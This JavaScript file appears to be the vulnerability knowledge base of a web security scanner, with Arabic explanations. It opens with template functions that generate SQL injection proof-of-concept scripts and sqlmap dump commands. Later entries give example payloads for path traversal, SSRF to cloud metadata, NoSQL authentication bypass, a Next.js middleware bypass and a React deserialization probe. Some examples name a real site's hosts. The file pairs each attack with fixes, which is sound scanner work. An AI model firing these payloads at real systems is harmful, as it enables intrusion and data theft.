      const injectedUrl = url.replace(new RegExp(`(${param}=)[^&]*`), `$1${encodeURIComponent(payload)}`);
      return `# Time the request to confirm the delay
curl -w "\\n[Time: %{time_total}s]\\n" \\
  -X GET "${injectedUrl}" \\
  -H "User-Agent: Mozilla/5.0 (Falcon-MAG)" \\
  -s -o /dev/null

# Expected: Response time > 5 seconds (baseline ~0.8s)`;
    },

    poc_python: (url, param, payload) => {
      const injectedUrl = url.replace(new RegExp(`(${param}=)[^&]*`), `$1${encodeURIComponent(payload)}`);
      return `import requests
import time

# Time-based blind SQL injection PoC
# Target: ${url}
# Parameter: ${param}

def test_sqli(target_url, param, payload, wait=5):
    """Test if the parameter is vulnerable to time-based SQLi."""
    injected = target_url.replace(
        f"{param}=",
        f"{param}=" + requests.utils.quote(payload)
    )

    # Baseline (no payload)
    start = time.time()
    try:
        requests.get(target_url, timeout=15, verify=False)
        baseline = time.time() - start
    except Exception as e:
        baseline = 0
        print(f"[!] Baseline failed: {e}")

    # With payload
    start = time.time()
    try:
        r = requests.get(injected, timeout=15, verify=False)
        elapsed = time.time() - start
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return False

    print(f"[*] Baseline: {baseline:.2f}s")
    print(f"[*] With payload: {elapsed:.2f}s")
    print(f"[*] Difference: {elapsed - baseline:.2f}s")

    if elapsed - baseline >= 4.0:
        print("[+] VULNERABLE: Time-based blind SQL injection confirmed!")
        print(f"[+] Payload: {payload}")
        return True
    else:
        print("[-] Not vulnerable (no significant delay)")
        return False

if __name__ == "__main__":
    test_sqli(
        target_url="${url}",
        param="${param}",
        payload="${payload}"
    )

# Next steps:
# 1. pip install sqlmap
# 2. sqlmap -u "${injectedUrl}" --technique=T --dbs --batch
# 3. sqlmap -u "${injectedUrl}" -D <db> -T <table> --dump`;
    },

    poc_http: (url, param, payload) => {
      const injectedUrl = url.replace(new RegExp(`(${param}=)[^&]*`), `$1${encodeURIComponent(payload)}`);
      const urlObj = (() => { try { return new URL(injectedUrl); } catch(_) { return null; } })();
      const path = urlObj ? urlObj.pathname + urlObj.search : "/";
      const host = urlObj ? urlObj.host : "target.com";
      return `GET ${path} HTTP/1.1
Host: ${host}
User-Agent: Mozilla/5.0 (Falcon-MAG Security Scanner)
Accept: */*
Accept-Language: en-US,en;q=0.9
Connection: close

# Expected response: delayed by ~5s (Time-based blind)
# Or SQL error in body (Error-based)`;
    },

    exploit_tools: [
      { name: "sqlmap", cmd: `sqlmap -u "<URL>" --technique=T --dbs --batch`, desc: "أتمتة كاملة للـ SQLi" },
      { name: "Burp Suite", cmd: "Intruder → SQLi payloads", desc: "اختبار يدوي مع Proxy" },
      { name: "OWASP ZAP", cmd: "Attack → SQL Injection", desc: "scanner تلقائي" },
    ],
  },
  "nosql_scanner": {
    name: "NoSQL Injection",
    severity: "critical",
    category: "Injection",
    icon: "💥",
    what: "حقن في قواعد بيانات NoSQL (MongoDB, CouchDB).",
    how: "حقن `{\"$ne\": null}` أو `[$ne]=1` في المعاملات. فحص تغيّر سلوك الرد.",
    impact: "تجاوز المصادقة (`password[$ne]=x`)، قراءة بيانات، تعديل.",
    fix: "تحقق من نوع المدخلات (type checking). استخدم مكتبات ORM آمنة. عطّل `$where` في MongoDB.",
    refs: ["OWASP: NoSQL Injection", "CWE-943"],
    example: "username[$ne]=admin"
  },

  // ============================================================
  // Access Control
  // ============================================================
  "idor_scanner": {
    name: "IDOR",
    severity: "high",
    category: "Access Control",
    icon: "🚪",
    what: "Insecure Direct Object Reference — الوصول إلى موارد مستخدمين آخرين بتغيير ID.",
    how: "اكتشاف معاملات رقمية، حقن IDs بديلة (1, 999999)، ومقارنة الردود بالـ baseline.",
    impact: "قراءة/تعديل/حذف بيانات مستخدمين آخرين، تصعيد صلاحيات.",
    fix: "تحقق من صلاحيات المستخدم على كل طلب. استخدم UUIDs بدلاً من IDs متسلسلة. طبّق authorization على server-side.",
    refs: ["OWASP: IDOR", "CWE-639"],
    example: "GET /api/user/123 → 200 (ملف مستخدم آخر)"
  },
  "csrf_checker": {
    name: "CSRF",
    severity: "medium",
    category: "Access Control",
    icon: "🎭",
    what: "Cross-Site Request Forgery — نموذج POST بدون CSRF token.",
    how: "تحليل كل نماذج HTML. البحث عن `csrf` أو `token` في الحقول.",
    impact: "يمكن للمهاجم جعل المستخدم المُسجَّل يُرسل طلبات خطرة (تحويل مال، تغيير بريد) من موقع خارجي.",
    fix: "أضف CSRF token فريد لكل جلسة. تحقق من `Origin`/`Referer`. استخدم `SameSite=Lax/Strict` للـ cookies.",
    refs: ["OWASP: CSRF", "CWE-352"],
    example: "Form POST بدون حقل csrf"
  },
  "clickjacking": {
    name: "Clickjacking",
    severity: "medium",
    category: "UI Redressing",
    icon: "🖼️",
    what: "إمكانية تضمين الموقع في iframe على موقع آخر (due to missing X-Frame-Options + CSP frame-ancestors).",
    how: "فحص ترويسات `X-Frame-Options` و `Content-Security-Policy: frame-ancestors`.",
    impact: "خداع المستخدم للضغط على أزرار حساسة (حذف حساب، تأكيد تحويل) دون علمه.",
    fix: "أضف `X-Frame-Options: DENY` و `CSP: frame-ancestors 'none'`",
    refs: ["OWASP: Clickjacking Defense", "CWE-1021"],
    example: "X-Frame-Options missing | CSP frame-ancestors missing"
  },

  // ============================================================
  // Server-Side
  // ============================================================
  "ssrf_scanner": {
    name: "SSRF",
    severity: "critical",
    category: "Server-Side",
    icon: "🌐",
    what: "Server-Side Request Forgery — جعل السيرفر يزور URL يختاره المهاجم.",
    how: "حقن URLs داخلية (`http://127.0.0.1`, `http://169.254.169.254`) في كل معامل يبدو كـ URL.",
    impact: "الوصول لخدمات داخلية (Redis, DB, AWS metadata)، قراءة ملفات محلية، تجاوز firewall.",
    fix: "قائمة بيضاء للـ URLs المسموحة. حظر العناوين الداخلية. لا تتبع redirects. استخدم service proxy.",
    refs: ["OWASP: SSRF", "CWE-918"],
    example: "?url=http://169.254.169.254/latest/meta-data/"
  },
  "path_traversal": {
    name: "Path Traversal",
    severity: "high",
    category: "Server-Side",
    icon: "📂",
    what: "حقن `../` للوصول لملفات خارج web root.",
    how: "حقن payloads مثل `../../../etc/passwd` و `..%2F..%2F` في معاملات الملفات.",
    impact: "قراءة ملفات حساسة: `/etc/passwd`, مفاتيح SSH، config files، شيفرة المصدر.",
    fix: "تحقق من اسم الملف (whitelist). استخدم `basename()`. لا تعتمد على مدخلات المستخدم في المسارات.",
    refs: ["OWASP: Path Traversal", "CWE-22"],
    example: "?file=../../../../etc/passwd"
  },

  // ============================================================
  // Redirect
  // ============================================================
  "open_redirect": {
    name: "Open Redirect",
    severity: "medium",
    category: "Redirect",
    icon: "↪️",
    what: "معامل يسمح بإعادة التوجيه لأي URL خارجي.",
    how: "حقن `https://evil.example.com` في معاملات مثل `url`, `redirect`, `next`، وفحص الرد.",
    impact: "يُستخدم في هجمات phishing — المستخدم يثق في `bank.com/redirect?url=evil.com` ويُحوّل لموقع خبيث.",
    fix: "قائمة بيضاء للـ URLs المسموحة. أو استخدم mapping (IDs داخلية بدلاً من URLs).",
    refs: ["OWASP: Open Redirect", "CWE-601"],
    example: "?url=https://evil.com → 302 Location: https://evil.com"
  },

  // ============================================================
  // JavaScript
  // ============================================================
  "js_secrets": {
    name: "أسرار مكشوفة في JavaScript",
    severity: "high",
    category: "Information Disclosure",
    icon: "🔑",
    what: "مفاتيح API / tokens / كلمات مرور مكتوبة في ملفات JS عامة.",
    how: "فحص كل ملفات JS بـ regex patterns (AWS, Stripe, GitHub, JWT, Generic).",
    impact: "حسب النوع: اختراق AWS، خسارة مالية (Stripe)، سرقة tokens، وصول غير مصرح.",
    fix: "انقل الأسرار إلى server-side. استخدم environment variables. أزل القيم من الكود المرسل للمتصفح.",
    refs: ["OWASP: Secrets Management", "CWE-798"],
    example: "sentry_key=xxx في sentry.js (تحقق يدوي)"
  },
  "prototype_pollution": {
    name: "Prototype Pollution",
    severity: "high",
    category: "JavaScript",
    icon: "☣️",
    what: "تلويث `Object.prototype` في JavaScript عبر مدخلات.",
    how: "حقن `__proto__[polluted]=yes` في المعاملات وفحص الرد.",
    impact: "تغيير سلوك التطبيق كاملاً، تجاوز فحوصات (`if (user.isAdmin)`)، RCE محتمل.",
    fix: "تحقق من أسماء الخصائص. استخدم `Object.create(null)`. حدّث المكتبات. استخدم `--disable-proto`.",
    refs: ["OWASP: Prototype Pollution", "CWE-1321"],
    example: "__proto__[polluted]=yes"
  },

  // ============================================================
  // Infrastructure
  // ============================================================
  "http_methods": {
    name: "طرق HTTP خطرة",
    severity: "medium",
    category: "Configuration",
    icon: "⚙️",
    what: "طرق HTTP مفتوحة (مثل TRACE، PUT، DELETE) قد تُستغل.",
    how: "إرسال كل طرق HTTP للهدف، وفحص الرد.",
    impact: "TRACE → سرقة cookies. PUT → رفع ملفات. DELETE → حذف.",
    fix: "عطّل الطرق غير المستخدمة في nginx/apache. اسمح فقط بـ GET/POST/HEAD.",
    refs: ["OWASP: HTTP Methods", "CWE-650"],
    example: "TRACE returns 200 OK"
  },
  "rate_limit_test": {
    name: "Rate Limiting مفقود",
    severity: "low",
    category: "Configuration",
    icon: "⏱️",
    what: "لا يوجد حد لعدد الطلبات المتكررة.",
    how: "إرسال 20 طلب متتالي وفحص وجود `429 Too Many Requests`.",
    impact: "Brute force لكلمات المرور، DDoS، scraping بدون قيود.",
    fix: "طبّق rate limiting على مستوى nginx/apache (مثلاً `limit_req`). استخدم Cloudflare/AWS WAF.",
    refs: ["OWASP: Blocking Brute Force", "CWE-770"],
    example: "No rate limiting after 20 requests"
  },
  "cookies_checker": {
    name: "Cookies بدون حماية",
    severity: "medium",
    category: "Configuration",
    icon: "🍪",
    what: "Cookies بدون علامات `Secure`, `HttpOnly`, `SameSite`.",
    how: "فحص خصائص كل cookie في الرد.",
    impact: "بدون `Secure` → MITM. بدون `HttpOnly` → XSS يقرأها. بدون `SameSite` → CSRF.",
    fix: "أضف: `Secure; HttpOnly; SameSite=Lax` (أو Strict) لكل cookie حساس.",
    refs: ["OWASP: Cookies", "CWE-1004"],
    example: "sessionid بدون HttpOnly"
  },
  "cors_checker": {
    name: "CORS Misconfiguration",
    severity: "medium",
    category: "Configuration",
    icon: "🌍",
    what: "إعداد CORS يسمح لأي origin بالوصول للبيانات.",
    how: "إرسال طلبات مع Origin مهاجم، وفحص `Access-Control-Allow-Origin`.",
    impact: "سرقة بيانات المستخدم من مواقع خارجية (مع credentials).",
    fix: "استخدم قائمة بيضاء دقيقة للـ origins. لا تستخدم `*` مع credentials.",
    refs: ["OWASP: CORS", "CWE-942"],
    example: "ACAO: * with ACAC: true"
  },
  "port_scanner": {
    name: "منافذ مفتوحة",
    severity: "info",
    category: "Network",
    icon: "🔌",
    what: "منافذ TCP مفتوحة على السيرفر.",
    how: "محاولة الاتصال بـ 18 منفذ شائع وفحص الاستجابة.",
    impact: "منافذ غير متوقعة → خدمات إدارية مكشوفة (Redis, MySQL, VNC).",
    fix: "أغلق كل المنافذ غير الضرورية. استخدم firewall. قيّد الوصول بـ IP.",
    refs: ["OWASP: Attack Surface", "CWE-1327"],
    example: "Port 21 (FTP) مفتوح"
  },
  "subdomain_enum": {
    name: "Subdomains مكتشفة",
    severity: "info",
    category: "Recon",
    icon: "🌐",
    what: "subdomains محتملة للهدف.",
    how: "تجربة subdomains شائعة (www, admin, dev, ...) عبر DNS.",
    impact: "subdomains قد تكون أقل حماية → مدخل للاختراق. **قد تكون false positives بسبب catch-all DNS.**",
    fix: "راجع subdomains يدوياً. احذف غير المستخدمة. راقب شهادات SSL.",
    refs: ["OWASP: Enumerate Infrastructure", "PTES: Intelligence Gathering"],
    example: "www.auth.qiwa.sa (تحقق بـ nslookup)"
  },
  "tls_checker": {
    name: "TLS/SSL",
    severity: "varies",
    category: "Cryptography",
    icon: "🔐",
    what: "بروتوكولات TLS/SSL ضعيفة أو معلومات الشهادة.",
    how: "الاتصال بـ 443 وفحص البروتوكول الفعلي، cipher، الشهادة.",
    impact: "TLS 1.0/1.1 → POODLE/BEAST. شهادة منتهية → MITM.",
    fix: "TLS 1.2+ فقط. Ciphers قوية. HSTS. جدّد الشهادات تلقائياً (Let's Encrypt).",
    refs: ["OWASP: TLS Cheat Sheet", "CWE-326"],
    example: "TLS 1.2 مدعوم"
  },
  "catch_all_detector": {
    name: "Catch-All Route",
    severity: "info",
    category: "SPA",
    icon: "🎯",
    what: "الموقع يعيد نفس الصفحة لكل مسار عشوائي (SPA routing).",
    how: "طلب 8 مسارات عشوائية، ومقارنة الردود.",
    impact: "**ليس ثغرة** — لكنه يسبب false positives في path_discovery.",
    fix: "لا حاجة — سلوك طبيعي لتطبيقات SPA (React/Vue).",
    refs: ["SPA routing pattern"],
    example: "كل المسارات → 200, size 5017"
  },
  "js_endpoints": {
    name: "Endpoints مكتشفة",
    severity: "info",
    category: "Recon",
    icon: "🔍",
    what: "URLs و APIs مذكورة في ملفات JavaScript.",
    how: "استخراج كل URLs من كل ملفات JS.",
    impact: "يكشف microservices، APIs داخلية، endpoints غير موثقة → توسيع سطح الهجوم.",
    fix: "راجع endpoints يدوياً. أزل المذكورة بالخطأ. وثّق APIs عامة.",
    refs: ["OWASP: Attack Surface Analysis"],
    example: "https://api.qiwa.sa/context/user"
  },
  "external_nmap": {
    name: "nmap Scan",
    severity: "info",
    category: "Network",
    icon: "📡",
    what: "فحص شامل للمنافذ عبر nmap.",
    how: "تشغيل nmap -sV -Pn -p 1-1000 target.",
    impact: "نفس port_scanner لكن أعمق (1000 منفذ + service detection).",
    fix: "أغلق المنافذ غير المستخدمة.",
    refs: ["nmap documentation"],
    example: "2 open ports"
  },
  "external_testssl": {
    name: "testssl.sh",
    severity: "varies",
    category: "Cryptography",
    icon: "🔐",
    what: "فحص TLS شامل عبر testssl.sh.",
    how: "testssl.sh --quiet target",
    impact: "فحص 40+ اختبار TLS (protocols, ciphers, certs, vulnerabilities).",
    fix: "حدّث إلى TLS 1.3، أزل ciphers ضعيفة.",
    refs: ["testssl.sh documentation"],
    example: "TLS audit complete"
  },
  "external_subfinder": {
    name: "subfinder",
    severity: "info",
    category: "Recon",
    icon: "🌐",
    what: "تعداد subdomains عبر مصادر متعددة.",
    how: "subfinder -d domain.com",
    impact: "يكشف subdomains غير معروفة (crt.sh, virustotal, passive DNS).",
    fix: "راجع subdomains، احذف غير المستخدمة.",
    refs: ["subfinder documentation"],
    example: "N subdomains found"
  },
  "external_searchsploit": {
    name: "searchsploit",
    severity: "varies",
    category: "Recon",
    icon: "💣",
    what: "بحث في Exploit-DB عن exploits للتقنيات المكتشفة.",
    how: "searchsploit --json <technology>",
    impact: "يعطي exploits جاهزة للمهاجم.",
    fix: "حدّث المكتبات، راقب CVEs.",
    refs: ["Exploit-DB"],
    example: "Exploits found for Apache 2.4.x"
  },
  "cve_lookup": {
    name: "CVE Lookup",
    severity: "varies",
    category: "Recon",
    icon: "🎯",
    what: "البحث في NVD عن CVEs للتقنيات المكتشفة.",
    how: "استعلام NVD API لكل technology.",
    impact: "ربط التقنيات بـ CVEs معروفة.",
    fix: "حدّث المكتبات فوراً.",
    refs: ["NVD: National Vulnerability Database"],
    example: "React 18.2 → CVE-2024-XXXX"
  },

  // ============================================================
  // Modern Vulnerabilities (2025+) — ADDED 2026-09-19
  // ============================================================
  "nextjs_middleware_bypass": {
    name: "Next.js Middleware Bypass",
    severity: "critical",
    category: "Framework",
    icon: "⚡",
    cve: "CVE-2025-29927",
    what: "ثغرة في Next.js تسمح بتجاوز middleware المصادقة بالكامل عن طريق إرسال ترويسة داخلية `x-middleware-subrequest`. تم اكتشافها في مارس 2025 وتؤثر على Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5.",
    how: "1) إرسال طلب عادي لمسار محمي (مثل /admin) → الحصول على 401/403. 2) إعادة نفس الطلب مع ترويسة `x-middleware-subrequest: 1`. 3) إذا رجع 200 → تجاوز المصادقة.",
    impact: "تجاوز كامل للمصادقة. الوصول لصفحات إدارية. تخطي rate limits. تنفيذ إجراءات محظورة. يمكن أن يؤدي إلى اختراق كامل للتطبيق.",
    fix: "1) حدّث Next.js إلى 15.2.3+ أو 14.2.25+ أو 13.5.9+ أو 12.3.5+. 2) إن لم يمكن التحديث: احجب الترويسة `x-middleware-subrequest` على reverse proxy. 3) تحقق من المصادقة داخل كل صفحة محمية (defense in depth)، وليس فقط في middleware.",
    refs: [
      "CVE-2025-29927",
      "Next.js Security Advisory GHSA-f82v-jwr5-mffw",
      "PortSwigger: Next.js Middleware Bypass"
    ],
    example: "baseline=403, with-header=200"
  },

  "rsc_data_leakage": {
    name: "تسريب بيانات في RSC/Hydration State",
    severity: "high",
    category: "Information Disclosure",
    icon: "🕳️",
    what: "Server Components في Next.js تمرر كائنات كاملة للعميل ضمن state الـ hydration (__NEXT_DATA__ أو self.__next_f.push). إذا نسي المطور تصفية البيانات، تُسرَّب حقول حساسة (password_hash, api_keys, internal_notes) داخل HTML العام.",
    how: "1) طلب الصفحة. 2) استخراج JSON من <script id='__NEXT_DATA__'> أو من fragments self.__next_f.push. 3) فحص recursive عن keys مثل password/token/secret/api_key. 4) فحص regex لأنماط JWT, AWS, Stripe.",
    impact: "تسريب مباشر لبيانات حساسة بدون الحاجة لأي ثغرة أخرى. يمكن أن يحتوي على API keys تعطي وصول كامل، password hashes، بيانات موظفين، معلومات داخلية.",
    fix: "1) استخدم 'use server' بحذر في Server Components. 2) مرّر فقط الحقول المطلوبة (id, name) بدلاً من كائن المستخدم كاملاً. 3) استخدم DTOs. 4) راجع hydration state يدوياً قبل النشر.",
    refs: [
      "React Server Components Security",
      "Next.js Data Fetching Best Practices",
      "OWASP: Sensitive Data Exposure"
    ],
    example: '"api_key": "sk_live_..." في __NEXT_DATA__'
  },

  "react2shell_rce": {
    name: "React2Shell RCE (Flight Deserialization)",
    severity: "critical",
    category: "Remote Code Execution",
    icon: "💣",
    cve: "CVE-2025-55182",
    what: "ثغرة في React Server Components تستغل deserialization غير آمن في Flight Protocol. بإرسال payloads مثل $@1, $1, then, _response يمكن تحفيز gadget chains داخل عملية التصيير → RCE.",
    how: "1) إرسال POST مع Content-Type: text/x-component. 2) حقن payloads تشير لأشياء داخلية ($@1, $1). 3) مراقبة الرد: أخطاء 500 مع hasOwnProperty of undefined أو Flight Protocol أو stack traces تكشف react-server-dom-webpack.",
    impact: "تنفيذ كود عن بعد (RCE) على السيرفر. اختراق كامل للنظام. سرقة بيانات، تعديل، رفع shell. خطورة 10/10.",
    fix: "1) حدّث React إلى أحدث إصدار. 2) لا تعالج RSC payloads من مصادر غير موثوقة. 3) طبّق rate limiting على Server Actions. 4) استخدم WAF يرصد $@1 patterns.",
    refs: [
      "CVE-2025-55182",
      "React Server Components Deserialization",
      "Flight Protocol internals"
    ],
    example: '["$@1",{"then":true,"_response":{}}] → 500 hasOwnProperty'
  },

  "graphql_relay_idor": {
    name: "GraphQL Relay IDOR (Global ID)",
    severity: "high",
    category: "Access Control",
    icon: "🔓",
    what: "GraphQL Relay spec يستخدم Global IDs بترميز base64 (TypeName:rawId). المهاجم يستطيع تزوير IDs بأنواع حساسة (Admin, SecretAdminSettings, RootUser) لطلب كائنات غير مصرح بها عبر interface node(id:).",
    how: "1) اكتشاف GraphQL endpoint. 2) استخراج Global ID شرعي من { viewer { id } }. 3) Dictionary attack: لكل نوع حساس × IDs. 4) إرسال query على node(id:). 5) إذا لا يوجد error 'unknown type' → IDOR.",
    impact: "الوصول لكائنات إدارية عبر تزوير النوع فقط. تسريب بيانات موظفين، backup DB URLs، مفاتيح داخلية، وثائق خاصة. شائع جداً في bug bounty.",
    fix: "1) تحقق من صلاحيات المستخدم لكل node(id:) request. 2) لا تُعرّض أنواعاً حساسة لـ node interface. 3) استخدم visibility layer على schema. 4) طبّق field-level authorization.",
    refs: [
      "Amin Sadati GraphQL IDOR Research",
      "GraphQL Relay Specification",
      "OWASP API Security #1: BOLA"
    ],
    example: 'node(id: base64("SecretAdminSettings:1"))'
  },

  "ssr_proto_pollution": {
    name: "SSR Prototype Pollution",
    severity: "high",
    category: "Injection",
    icon: "☣️",
    what: "Prototype Pollution في سياق Server-Side Rendering. المهاجم يرسل JSON مع __proto__ أو constructor.prototype لـ API. إذا السيرفر يدمجها بشكل غير آمن، تُلوَّث Object.prototype → سلوك غريب في كل الصفحات.",
    how: "1) خذ baseline للـ homepage (hash + len). 2) أرسل payloads مثل {'__proto__':{'falcon_polluted':'marker'}} لـ endpoints. 3) أعد زيارة homepage. 4) إذا تغيّر hash أو ظهر marker → pollution ناجح.",
    impact: "يؤثر على كل طلبات المستخدمين اللاحقة (global state). يمكن أن يؤدي لـ: تجاوز فحوصات صلاحيات، RCE، DoS، حقن في قوالب SSR، تعديل سلوك التطبيق كاملاً.",
    fix: "1) استخدم Object.create(null) للكائنات الحساسة. 2) رفض __proto__ و constructor في JSON body. 3) استخدم مكتبات مثل lodash.mergeWith بحذر. 4) طبّق schema validation (zod, joi).",
    refs: [
      "CWE-1321: Prototype Pollution",
      "OWASP Prototype Pollution",
      "PortSwigger: Prototype Pollution"
    ],
    example: '{"__proto__":{"falcon_polluted":"marker"}} → homepage changed'
  },

  "tech_fingerprint": {
    name: "بصمة التقنيات",
    severity: "info",
    category: "Recon",
    icon: "🔎",
    what: "اكتشاف التقنيات المستخدمة في الموقع (Frontend / Backend / CMS / CDN) عبر headers و body و cookies. تُستخدم لتوجيه باقي الفحوصات تلقائياً.",
    how: "1) طلب الصفحة. 2) فحص headers محددة (x-nextjs-cache, cf-ray). 3) فحص قيم x-powered-by و server. 4) regex على body. 5) فحص cookies.",
    impact: "ليس ثغرة بحد ذاتها. لكن يوجّه باقي الفحوصات → تسريع 60% في الوقت. يكشف أيضاً إصدارات (fingerprint).",
    fix: "أزل headers الكاشفة (X-Powered-By, Server). استخدم reverse proxy يخفي التقنيات.",
    refs: [
      "OWASP: Fingerprinting",
      "PTES Intelligence Gathering"
    ],
    example: "Detected: Next.js, React RSC, Vercel"
  },


  // ============================================================
  // Generic fallbacks
  // ============================================================
  "Headers": {
    name: "ترويسات HTTP",
    severity: "medium",
    category: "Headers",
    icon: "📋",
    what: "مشاكل في ترويسات HTTP الأمنية.",
    how: "فحص ترويسات الرد مقابل قائمة معايير OWASP.",
    impact: "ضعف في الدفاعات — راجع كل ترويسة على حدة.",
    fix: "طبّق security headers وفق OWASP Secure Headers Project.",
    refs: ["OWASP: Secure Headers Project"],
    example: "-"
  },
  "unknown": {
    name: "ثغرة (نوع غير معروف)",
    severity: "info",
    category: "General",
    icon: "❓",
    what: "ثغرة لم يُعرف نوعها بدقة.",
    how: "تعتمد على الـ module المُكتشف.",
    impact: "راجع التفاصيل في الـ evidence.",
    fix: "راجع URL والـ payload في التفاصيل.",
    refs: ["OWASP Top 10"],
    example: "-"
  }
}

/**
 * Find knowledge entry for a finding.
 * Tries exact match, then substring match, then category, then unknown.
 */
export function findKnowledge(finding) {
  if (!finding) return VULN_KNOWLEDGE.unknown

  const candidates = [
    finding.subtype,
    finding.vuln_class,
    finding.title,
    finding.category,
    finding.class,
    finding.param,
  ].filter(Boolean).map(s => String(s).toLowerCase())

  // 1) exact
  for (const key of Object.keys(VULN_KNOWLEDGE)) {
    const lk = key.toLowerCase()
    for (const c of candidates) {
      if (c === lk) return { ...VULN_KNOWLEDGE[key], _matched: key }
    }
  }

  // 2) substring
  for (const key of Object.keys(VULN_KNOWLEDGE)) {
    const lk = key.toLowerCase()
    for (const c of candidates) {
      if (c.includes(lk) || lk.includes(c)) {
        return { ...VULN_KNOWLEDGE[key], _matched: key }
      }
    }
  }

  return VULN_KNOWLEDGE.unknown
}